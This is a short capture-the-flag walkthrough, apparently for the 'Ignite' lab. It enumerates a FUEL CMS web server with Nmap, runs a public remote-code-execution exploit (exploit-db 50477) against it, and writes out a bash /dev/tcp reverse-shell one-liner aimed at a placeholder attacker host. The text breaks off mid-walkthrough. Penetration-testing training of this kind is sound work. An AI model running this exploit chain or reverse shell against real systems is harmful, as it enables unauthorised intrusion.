We start off by enumerating open ports with with Nmap



{% highlight bash %}
$  nmap -sCV x.x.x.x
{% endhighlight bash %}


We can see that only port 80 is open and running a web server



********************1-ignite.png


Our output shows us that there is a '/robots.txt' entry stating that the '/fuel' page is disallowed

Navigating here shows us a login page 

Our Nmap scan shows that the site is using 'FUEL CMS' to run the site
Lets search [exploit-db](https://www.exploit-db.com/exploits/50477) for Fuel CMS exploits
 

> https://www.exploit-db.com/exploits/50477


********************2ignite.png



We find an exploit that looks promising
Lets save this to our machine and run the script below, specifying the target URL



{% highlight bash %}
$ python3 50477.py -u http://x.x.x.x
{% endhighlight bash %}


We can see that this RCE script is successful
We can now run remote commands on the target machine

I will use this bash 1-liner to create the shell


{% highlight bash %}
$ bash -i >& /dev/tcp/attacker_ip/port 0>&1
{% endhighlight bash %}


You can find the reverse shell used here and more at: [pentestmonkey.net](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)




We can save the script as a '.sh' file on our machine
